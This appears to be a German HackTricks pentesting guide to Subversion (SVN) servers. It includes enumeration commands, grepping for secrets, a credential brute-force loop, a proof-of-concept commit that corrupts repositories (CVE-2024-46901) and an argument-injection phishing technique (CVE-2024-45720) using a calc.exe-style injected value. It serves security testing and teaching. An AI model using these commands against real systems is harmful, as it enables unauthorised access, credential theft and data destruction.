# 3690/tcp - Pentesting Subversion (SVN) Server

{{#include ../banners/hacktricks-training.md}}

## Grundlegende Informationen

**Subversion (SVN)** ist ein zentrales **Versionskontrollsystem** (Apache-Lizenz), das zur Versionierung von Software und zur Revisionskontrolle verwendet wird.

**Standardport:** `3690/tcp` (svnserve). Es kann auch über **HTTP/HTTPS** mittels `mod_dav_svn` und über **svn+ssh** zugänglich gemacht werden.
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## Enumeration
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### Auth & Misconfig Hunting

- `svnserve.conf` kann `anon-access = read` erlauben (oder sogar write). Wenn Sie auflisten können, versuchen Sie `checkout`, um secrets, scripts, CI tokens zu dumpen.
- Repositories speichern häufig **Build-Pipelines**, **Deployment-Keys** und **Datenbank-Anmeldedaten** in versionierten Konfigurationsdateien. Durchsuchen Sie die Working Copy nach dem `checkout`: `grep -R "password\|secret\|token" -n .`.
- Wenn `svn+ssh` aktiviert ist, erlauben Benutzer-Shells oft eingeschränkte `svnserve`-Befehle; versuchen Sie `ssh user@host svnserve -t` mit manipulierten Unterbefehlen, um Wrapper zu umgehen.

### Bruteforcing credentials (svnserve)

`sasl`-Authentifizierung (falls aktiviert) und einfache Passwortdateien werden nur durch den Transport geschützt; standardmäßig keine Sperrmechanismen. Eine schnelle Bash-Schleife kann Anmeldedaten ausprobieren:
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## Aktuelle Schwachstellen (praktische Auswirkungen)

### mod_dav_svn DoS durch Steuerzeichen (CVE-2024-46901)

- Ein Benutzer mit Commit-Rechten kann einen Pfad schreiben, der Steuerzeichen enthält (z. B. `\x01`, `\x7f`), die **das Repository beschädigen**, wodurch spätere checkouts/logs fehlschlagen und möglicherweise `mod_dav_svn`-Worker abstürzen.
- Betroffen ist Subversion ≤ **1.14.4**, wenn es über **HTTP(S)** (`mod_dav_svn`) bereitgestellt wird. Behoben in **1.14.5**.
- PoC commit mit `svnmucc` (erfordert gültige Commit-Creds):
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- Nach dem Commit können normale Clients abstürzen oder Updates verweigern, bis Admins die Revision manuell mit `svnadmin dump/filter/load` entfernen.

### Windows argument injection in svn client (CVE-2024-45720)

- Unter Windows erlaubt die "best-fit" Zeichenkodierung in `svn.exe` **command-line argument injection**, wenn speziell präparierte non‑ASCII Pfade/URLs verarbeitet werden, was zu arbitrary program execution führen kann.
- Betroffen ist Subversion ≤ **1.14.3** nur unter Windows; behoben in **1.14.4**. Angriffsvektor: phishing eines Entwicklers, damit er `svn` auf einer vom Angreifer kontrollierten URL/Pfad ausführt.
- Pentest angle: falls Sie ein network share oder ein ZIP kontrollieren, das einem Windows-Entwickler gegeben wird, benennen Sie eine repo-URL oder einen working-copy Pfad so, dass er best-fit Bytes enthält, die in `" & calc.exe & "`-artige injizierte Argumente dekodieren, und bringen Sie das Opfer dazu, `svn status` oder Ähnliches auf diesem Pfad auszuführen.

## Hinweise zum Exploitation Workflow

1. Zugriffsmethode prüfen: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn) oder `svn+ssh://`.
2. Zuerst anonymen Lesezugriff versuchen; dann common creds durchprobieren. Wird HTTP Basic verwendet, reuse creds, die anderswo gefunden wurden.
3. **Enumerate hooks**: `hooks/pre-commit`, `post-commit` Scripts enthalten manchmal plaintext credentials oder Hostnamen.
4. `svn:externals` nutzen, um zusätzliche Pfade von anderen Hosts zu ziehen; nach dem Checkout mit `svn propget svn:externals -R .` auflisten.
5. Version leaks: HTTP response headers von `mod_dav_svn` zeigen meist die Subversion- und Apache-Version; mit 1.14.5 vergleichen, um verwundbare Ziele zu identifizieren.
6. Falls Sie Dateisystemzugriff auf das Repo erhalten, erlauben `svnadmin dump`/`svnlook author`/`svnlook dirs-changed` eine Offline-Analyse ohne Credentials.

## Referenzen

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
